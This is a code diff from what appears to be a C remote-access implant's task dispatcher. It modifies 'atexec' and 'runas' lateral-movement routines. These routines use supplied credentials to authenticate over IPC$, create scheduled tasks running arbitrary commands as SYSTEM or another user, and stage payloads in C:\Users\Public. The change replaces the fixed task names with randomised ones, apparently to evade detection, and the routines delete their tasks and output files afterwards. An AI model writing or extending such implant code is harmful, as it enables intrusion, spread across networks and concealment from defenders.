@@ -3252,6 +3252,8 @@ void dispatch_task(AgentTask *task) {
         if (!lat_host[0]) { agent_send_result(task->id,"","LATERAL: host required"); return; }
         char lat_buf[4096];
         if (_stricmp(lat_method,"atexec")==0) {
+            char at_tn[32];
+            snprintf(at_tn, sizeof(at_tn), "svc%08x", (unsigned)GetTickCount());
             /* Authenticate */
             snprintf(lat_buf,sizeof(lat_buf),
                 "net use \\\\%s\\IPC$ \"%s\" /user:\"%s\" 2>&1",lat_host,lat_pass,lat_user);
@@ -3263,12 +3265,12 @@ void dispatch_task(AgentTask *task) {
             /* Create task */
             snprintf(lat_buf,sizeof(lat_buf),
                 "schtasks /Create /S %s /RU SYSTEM /SC ONCE /ST 00:00 /F "
-                "/TN endgame_lat /TR \"cmd /c %s > %s 2>&1\" 2>&1",
-                lat_host,lat_cmd,outf);
+                "/TN %s /TR \"cmd /c %s > %s 2>&1\" 2>&1",
+                lat_host,at_tn,lat_cmd,outf);
             char *lr2=run_shell(lat_buf); free(lr2);
             /* Run task */
             snprintf(lat_buf,sizeof(lat_buf),
-                "schtasks /Run /S %s /TN endgame_lat 2>&1",lat_host);
+                "schtasks /Run /S %s /TN %s 2>&1",lat_host,at_tn);
             char *lr3=run_shell(lat_buf); free(lr3);
             Sleep(5000);
             /* Read output */
@@ -3278,7 +3280,7 @@ void dispatch_task(AgentTask *task) {
             free(lat_result);
             /* Cleanup */
             snprintf(lat_buf,sizeof(lat_buf),
-                "schtasks /Delete /S %s /TN endgame_lat /F 2>&1",lat_host);
+                "schtasks /Delete /S %s /TN %s /F 2>&1",lat_host,at_tn);
             char *lr4=run_shell(lat_buf); free(lr4);
             DeleteFileA(outf);
             snprintf(lat_buf,sizeof(lat_buf),"net use \\\\%s\\IPC$ /del /y 2>&1",lat_host);
@@ -3352,24 +3354,38 @@ void dispatch_task(AgentTask *task) {
                 "[+] psexec → %s\n    svc : %s\n    path: %s", lat_host, svc_name, remote_path);
             agent_send_result(task->id, res_ps, "");
         } else if (_stricmp(lat_method,"runas")==0) {
-            /* Run payload as local user via schtasks */
+            /* Run payload as local user via schtasks.
+             * Copy to C:\Users\Public\ so the target user can read it. */
+            char ru_tn[32];
+            snprintf(ru_tn, sizeof(ru_tn), "svc%08x", (unsigned)GetTickCount());
             const char *ru=lat_user;
             if(strncmp(lat_user,".\\",2)==0)ru=lat_user+2;
             else if(strncmp(lat_user,"./",2)==0)ru=lat_user+2;
+            /* Stage to world-readable path */
+            char pub_path[512]={0};
+            const char *base=strrchr(lat_cmd,'\\');
+            base = base ? base+1 : lat_cmd;
+            snprintf(pub_path, sizeof(pub_path), "C:\\Users\\Public\\%s", base);
+            if (_stricmp(lat_cmd, pub_path) != 0)
+                CopyFileA(lat_cmd, pub_path, FALSE);
+            if (GetFileAttributesA(pub_path) == INVALID_FILE_ATTRIBUTES)
+                strncpy(pub_path, lat_cmd, sizeof(pub_path)-1);
             char ru_res[4096]={0};
             snprintf(lat_buf,sizeof(lat_buf),
-                "schtasks /Create /SC ONCE /ST 00:00 /F /TN endgame_ru "
+                "schtasks /Create /SC ONCE /ST 00:00 /F /TN %s "
                 "/TR \"\\\"%s\\\"\" /RU \"%s\" /RP \"%s\" 2>&1",
-                lat_cmd,ru,lat_pass);
+                ru_tn,pub_path,ru,lat_pass);
             char *rr1=run_shell(lat_buf);
             snprintf(ru_res,sizeof(ru_res),"[+] runas → %s @ %s\n    cmd: %s\n%s\n",
-                ru,lat_host,lat_cmd,rr1?rr1:"");
+                ru,lat_host,pub_path,rr1?rr1:"");
             free(rr1);
-            char *rr2=run_shell("schtasks /Run /TN endgame_ru 2>&1");
+            snprintf(lat_buf,sizeof(lat_buf),"schtasks /Run /TN %s 2>&1",ru_tn);
+            char *rr2=run_shell(lat_buf);
             strncat(ru_res,rr2?rr2:"",sizeof(ru_res)-strlen(ru_res)-1);
             free(rr2);
             Sleep(3000);
-            char *rr3=run_shell("schtasks /Delete /TN endgame_ru /F 2>&1");
+            snprintf(lat_buf,sizeof(lat_buf),"schtasks /Delete /TN %s /F 2>&1",ru_tn);
+            char *rr3=run_shell(lat_buf);
             strncat(ru_res,rr3?rr3:"",sizeof(ru_res)-strlen(ru_res)-1);
             free(rr3);
             agent_send_result(task->id,ru_res,"");
